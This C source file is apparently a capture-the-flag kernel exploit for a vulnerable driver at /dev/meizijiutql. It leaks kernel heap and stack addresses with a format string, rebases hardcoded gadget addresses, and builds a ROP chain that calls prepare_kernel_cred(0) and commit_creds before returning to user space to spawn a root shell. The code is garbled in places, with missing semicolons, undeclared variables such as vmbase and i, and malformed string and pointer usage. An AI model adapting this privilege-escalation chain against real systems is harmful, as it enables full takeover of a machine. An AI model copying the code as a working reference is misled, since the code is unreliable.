#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <stdint.h>
unsigned long long heap_addr = 0;
unsigned long long stack_addr = 0;
unsigned long long kernel_addr = 0;
unsigned long long commit_creds = 0xffffffff8c681410;
unsigned long long prepare_kernel_cred = 0xffffffff8c681790;
unsigned long long vmlinux_raw = 0xffffffff81000000;

unsigned long long user_cs, user_ss, user_rflags, user_sp;
unsigned long user_stack = 0;
unsigned long long p_rdi_r = 0xffffffff81001388;
unsigned long long p_rdx_r = 0xffffffff81044f17;
unsigned long long p_rcx_r = 0xffffffff81021e53;
unsigned long long mov_rdi_rax_call_rdx = 0xffffffff8101aa6a;
unsigned long long swapgs_popfq_ret = 0xffffffff81a00d5a;
unsigned long long rop[0x1000] = {0};

void get_addr(){
    int addr_fd = open('/tmp/res.txt', O_RDONLY);
    char buf[0x1001] = {0};
    lseek(addr_fd, -0x1000, SEEK_END);
    read(addr_fd, buf, 0x1000);
    close(addr_fd);
    char* idx = strstr(buf, "heap_addr:");
    if(idx > 0)
    {
        idx += 10;
        heap_addr = strtoull(idx, idx+16, 16);
        printf("kernel_addr:%p\n",heap_addr);
    }
    else{
        puts("Found heap_addr failed");
        exit(0);
    }
    idx = strstr(buf, "stack_addr:");
    if(idx > 0)
    {
        idx += 11;
        stack_addr = strtoull(idx, idx+16, 16);
        printf("stack_addr:%p\n",stack_addr);
    }
    else{
        puts("Found stack_addr failed\n");
        exit(0);
    }
}

void get_shell(){
   if(!getuid()){
      system("/bin/sh");
   }
   else{
      puts("[*]spawn shell error!");
   }
   exit(0);
}


void save_status(){
   __asm__("mov user_cs,cs;"
           "mov user_ss,ss;"
           "mov user_sp,rsp;"
           "pushf;" //push eflags
           "pop user_rflags;"
          );
}

void kernel_malloc(int fd, int size){
    ioctl(fd, 0x73311337, size);
}

void kernel_free(int fd)
{
        ioctl(fd, 0x13377331);
}

int main(){
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    int fd = open("/dev/meizijiutql", O_RDWR);

    kernel_malloc(fd, 168);

    char buf[150] = "%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-heap_addr:%llx-%llx-%llx-%llx-%llx-kernel_addr:%llx-stack_addr:%llx-%llx-%llx\n";
    //memset(buf, '%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-heap_addr:%llx-%llx-%llx-%llx-%llx-kernel_addr:%llx-stack_addr:%llx-%llx-%llx', 0x50);
    write(fd, buf, 150);

    printf("=========>begin leak addr\n");
    ioctl(fd, 0xDEADBEEF);

    puts("please input kernel_addr:");
    scanf("%llx",(size_t *)kernel_addr);
    puts("please input stack_addr:");
    scanf("%llx",(size_t *)stack_addr);

    puts("kernel free:")
    kernel_free(fd);

    vmbase = kernel_addr - 0x1c9a268
    size_t offset = vmbase - vmlinux_raw
    p_rdi_r = offset + p_rdi_r;
    p_rdx_r = offset + p_rdx_r;
    p_rcx_r = offset + p_rcx_r;
    mov_rdi_rax_call_rdx = offset + mov_rdi_rax_call_rdx;
    swapgs_popfq_ret = offset + swapgs_popfq_ret;
    prepare_kernel_cred = offset + prepare_kernel_cred;
    commit_creds = offset + commit_creds;
    size_t rsp_addr = stack_addr - 0x88;
    puts("prepare ROP:");
    //prepare_kernel_cred(0)
    rop[i++] = p_rdi_r;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;

    //commit_cread(rax)
    rop[i++] = p_rdx_r;
    rop[i++] = p_rcx_r;
    rop[i++] = mov_rdi_rax_call_rdx;
    rop[i++] = commit_creds;

    //kernel space to user space: swapgs ireta
    //swapgs: get kernle data structure
    //popfq: pop eflags
    //retn iretq
    rop[i++] = swapgs_popfq_ret;
    rop[i++] = 0;

    //ireta: from kernle space to user space
    //prepare cs, eflags.rsp
    rop[i++] = (size_t)get_shell;

    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    save_status()
    //write ROP into stack
    char mem[0xc0+0x10];
    memset(mem,0x41,0xd0);
    memcpy(mem+0xc0,rsp_addr,0x10);
    write(1,mem,0xd0);
    kernel_malloc(fd,168);
    write(fd,mem,0xd0);
    kernel_malloc(fd,168);
    char buf2[100] = {0};
    write(fd,buf2,100);
    kernel_malloc(fd,168);
    write(fd,(char*)rop,180);
    kernel_malloc(fd,168);
    write(fd,(char*)rop,180);

    return 0;
}